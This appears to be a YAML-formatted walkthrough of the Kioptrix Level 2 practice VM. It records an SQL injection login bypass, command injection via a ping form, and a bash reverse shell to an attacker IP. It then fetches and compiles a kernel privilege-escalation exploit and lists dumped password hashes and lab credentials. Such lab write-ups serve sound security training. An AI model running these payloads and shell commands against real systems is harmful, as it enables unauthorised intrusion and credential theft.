      - description: |
          We find a login form served at `80/tcp`. Within HTML comments we find reference to a possible username `admin` and successfully login using SQL injection:
        command: |
          admin/' or 1=1 -- -
        screenshot:
          - ./screenshot01.png
          - ./screenshot02.png
      - description: |
          Once logged in, we find a web administration console with a text input field to accept an IP address. The web console will `POST` this IP to the `pingit.php` script that runs a `ping` query against this IP and shows result:
        screenshot:
          - ./screenshot03.png
          - ./screenshot04.png
    findings:
      openports:
        - '22/tcp    |  ssh       |  OpenSSH 3.9p1 (protocol 1.99)'
        - '80/tcp    |  http      |  Apache httpd 2.0.52 ((CentOS))'
        - '111/tcp   |  rpcbind   |  2 (RPC #100000)'
        - '443/tcp   |  ssl/http  |  Apache httpd 2.0.52 ((CentOS))'
        - '625/tcp   |  status    |  1 (RPC #100024)'
        - '631/tcp   |  ipp       |  CUPS 1.1'
        - '3306/tcp  |  mysql     |  MySQL (unauthorized)'
  exploitation:
    steps:
      - description: |
          We try to inject additional command after the IP using a `;` as separator and get results back:
        command: |
          8.8.8.8 ; uname -a
        screenshot:
          - ./screenshot05.png
          - ./screenshot06.png
      - description: |
          We can also run commands without providing the IP which makes it a little faster to get results back:
        command: |
          ; uname -a
        screenshot:
          - ./screenshot07.png
          - ./screenshot08.png
      - description: |
          We try to use Python to get a reverse shell connection but it fails. We fallback on Bash reverse shell and it works:
        command: |
          nc -nlvp 443
          ; bash -i >& /dev/tcp/192.168.92.183/443 0>&1
        screenshot:
          - ./screenshot09.png
          - ./screenshot10.png
          - ./screenshot11.png
  postexploit:
    user: apache
    hostname: kioptrix.level2
    id: |
      uid=48(apache) gid=48(apache) groups=48(apache)
    uname: |
      Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
    ifconfig: |
      eth0  Link encap:Ethernet  HWaddr 00:0C:29:DD:3C:B5
            inet addr:192.168.92.182  Bcast:192.168.92.255  Mask:255.255.255.0
            inet6 addr: fe80::20c:29ff:fedd:3cb5/64 Scope:Link
            UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
            RX packets:695106 errors:16 dropped:72 overruns:0 frame:0
            TX packets:647251 errors:0 dropped:0 overruns:0 carrier:0
            collisions:0 txqueuelen:1000
            RX bytes:77457955 (73.8 MiB)  TX bytes:136053412 (129.7 MiB)
            Interrupt:177 Base address:0x2000
    users:
      - root
  privesc:
    steps:
      - description: |
          We try the usuals (`crontab`|`setuid`|`chkrootkit`|etc.) but do not find anything interesting. While exploring the current directory, we find that `/var/www/html/index.php` file has hardcoded MySQL credentials for user `john`:
        command: |
          head /var/www/html/index.php
            mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
        screenshot:
          - ./screenshot12.png
      - description: |
          We find web application password hashes for users `admin` and `john` from the `users` table within `webapp` database:
        command: |
          mysql -h localhost -u john -p
            show databases;
            use webapp;
            show tables;
            select * from users;
        screenshot:
          - ./screenshot13.png
          - ./screenshot14.png
      - description: |
          From the `/etc/redhat-release` file we find that the target system is `CentOS release 4.5 (Final)`:
        command: |
          cat /etc/redhat-release
        screenshot:
          - ./screenshot15.png
      - description: |
          We find an exploit for this CentOS release using `searchsploit`:
        command: |
          searchsploit linux kernel centos 4.5
            Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)  | exploits/linux_x86/local/9542.c
      - description: |
          We transfer this exploit file to the target system, compile it using `gcc` and execute it to get elevated access:
        command: |
          sharehttp 9999
          cd /tmp
          wget http://192.168.92.183:9999/9542.c
          gcc -o 9542 9542.c
          ./9542
        screenshot:
          - ./screenshot16.png
          - ./screenshot17.png
          - ./screenshot18.png
    vuln:
      - cve: 2009-2698
        edb: 9542
        links:
          - https://www.exploit-db.com/exploits/9542
  loot:
    hashes:
      - 'root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::'
      - 'john:$1$wk7kHI5I$2kNTw6ncQQCecJ.5b8xTL1:14525:0:99999:7:::'
      - 'harold:$1$7d.sVxgm$3MYWsHDv0F/LP.mjL9lp/1:14529:0:99999:7:::'
    credentials:
      mysql:
        - john/hiroshima
      webapp:
        - admin/5afac8d85f
        - john/66lajGGbla
  learning:
